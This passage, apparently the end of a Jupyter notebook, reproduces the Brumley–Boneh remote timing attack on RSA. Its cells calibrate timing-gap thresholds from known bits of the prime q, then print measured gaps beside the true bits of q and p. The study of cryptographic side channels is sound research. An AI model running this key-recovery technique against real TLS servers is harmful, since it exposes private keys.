    "First, we need to know what gaps to consider \"large\" and what gaps to consider \"small\". Since we know the first 3 bits of $q$, take measurements of their zero-one gaps and use those as reference points."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "zero_gaps = []\n",
    "one_gaps = []"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "T_g_low, T_g_high = learn_ith_bit_of_q(q_bits, 1, N, neighbourhood_size=400)\n",
    "one_gaps.append(abs(T_g_low-T_g_high))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "T_g_low, T_g_high = learn_ith_bit_of_q(q_bits, 2, N, neighbourhood_size=400)\n",
    "zero_gaps.append(abs(T_g_low-T_g_high))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "([3620859], [617321])"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "one_gaps, zero_gaps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2119090.0"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "midpoint = (sum(one_gaps)/len(one_gaps) + sum(zero_gaps)/len(zero_gaps))/2\n",
    "midpoint"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So if a gap is below $midpoint$ this implies a value of 1, if its above $midpoint$ this implies a value of 0."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[768620,\n",
       " 2182199,\n",
       " 2324619,\n",
       " 269411,\n",
       " 1898177,\n",
       " 3076555,\n",
       " 2055003,\n",
       " 1270122,\n",
       " 2717880,\n",
       " 2028538,\n",
       " 4886555,\n",
       " 403202,\n",
       " 2126328,\n",
       " 360893,\n",
       " 5574948,\n",
       " 1522366,\n",
       " 3794700,\n",
       " 406081,\n",
       " 6665577,\n",
       " 1063060]"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "zero_one_gaps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1 768620\n",
      "1 2182199\n",
      "0 2324619\n",
      "1 269411\n",
      "1 1898177\n",
      "0 3076555\n",
      "0 2055003\n",
      "0 1270122\n",
      "1 2717880\n",
      "1 2028538\n",
      "0 4886555\n",
      "0 403202\n",
      "1 2126328\n",
      "0 360893\n",
      "0 5574948\n",
      "0 1522366\n",
      "1 3794700\n",
      "0 406081\n",
      "0 6665577\n",
      "0 1063060\n"
     ]
    }
   ],
   "source": [
    "for i in range(0, 20):\n",
    "    print(correct_q_bits[i], zero_one_gaps[i])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1 768620\n",
      "1 2182199\n",
      "0 2324619\n",
      "1 269411\n",
      "1 1898177\n",
      "1 3076555\n",
      "1 2055003\n",
      "1 1270122\n",
      "0 2717880\n",
      "1 2028538\n",
      "0 4886555\n",
      "0 403202\n",
      "0 2126328\n",
      "0 360893\n",
      "1 5574948\n",
      "0 1522366\n",
      "1 3794700\n",
      "1 406081\n",
      "0 6665577\n",
      "1 1063060\n"
     ]
    }
   ],
   "source": [
    "correct_p_bits = attack.sympy_integer_to_bits(p)\n",
    "for i in range(0, 20):\n",
    "    print(correct_p_bits[i], zero_one_gaps[i])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## References\n",
    "  - [1] https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
